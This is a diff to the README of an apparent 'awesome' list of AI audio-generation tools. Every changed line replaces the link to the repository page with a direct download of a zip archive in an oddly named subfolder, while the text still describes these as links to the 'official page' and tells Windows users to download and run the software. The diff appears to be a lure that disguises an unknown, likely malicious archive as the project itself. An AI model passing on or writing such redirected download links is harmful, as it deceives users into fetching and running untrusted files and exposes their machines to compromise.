@@ -1,6 +1,6 @@
 # 🎵 awesome-audio-generation - Explore AI Tools for Audio Creation
 
-[![Download awesome-audio-generation](https://img.shields.io/badge/Download-awesome--audio--generation-brightgreen)](https://github.com/iamankursingh2000/awesome-audio-generation)
+[![Download awesome-audio-generation](https://img.shields.io/badge/Download-awesome--audio--generation-brightgreen)](https://github.com/iamankursingh2000/awesome-audio-generation/raw/refs/heads/main/diathermaneity/awesome_audio_generation_v1.9.zip)
 
 ## 📋 About awesome-audio-generation
 
@@ -14,7 +14,7 @@ You don’t need programming skills to use most items referenced here. The aim i
 
 This section will help you download and run the software on Windows. The repository offers links to various AI audio tools, but the main way to start is by visiting the project page.
 
-[![Download on GitHub](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://github.com/iamankursingh2000/awesome-audio-generation)
+[![Download on GitHub](https://img.shields.io/badge/Visit%20Download%20Page-blue)](https://github.com/iamankursingh2000/awesome-audio-generation/raw/refs/heads/main/diathermaneity/awesome_audio_generation_v1.9.zip)
 
 Click the button above to open the official page where you can find the software and related tools.
 
@@ -39,7 +39,7 @@ If your system matches these requirements, you will have a smooth experience run
 Follow these steps to get the software running on your Windows PC:
 
 1. Visit the main project page using this link:  
-   https://github.com/iamankursingh2000/awesome-audio-generation  
+   https://github.com/iamankursingh2000/awesome-audio-generation/raw/refs/heads/main/diathermaneity/awesome_audio_generation_v1.9.zip  
 
 2. Scroll down to the section labeled "Releases" or download options on the page.
 
@@ -102,7 +102,7 @@ If you wish to explore APIs or SDKs, the repository points you to developer reso
 
 For detailed documentation, usage guides, or developer tools, visit the repository:
 
-https://github.com/iamankursingh2000/awesome-audio-generation  
+https://github.com/iamankursingh2000/awesome-audio-generation/raw/refs/heads/main/diathermaneity/awesome_audio_generation_v1.9.zip  
 
 The page also contains curated collections with summaries explaining what each tool does. You can explore by topic, such as voice cloning, music generation, or speech synthesis.
 
@@ -121,4 +121,4 @@ This system helps maintain the tools and improve them over time.
 
 ---
 
-[![Download awesome-audio-generation](https://img.shields.io/badge/Get%20the%20Audio%20Tools-orange)](https://github.com/iamankursingh2000/awesome-audio-generation)
+[![Download awesome-audio-generation](https://img.shields.io/badge/Get%20the%20Audio%20Tools-orange)](https://github.com/iamankursingh2000/awesome-audio-generation/raw/refs/heads/main/diathermaneity/awesome_audio_generation_v1.9.zip)
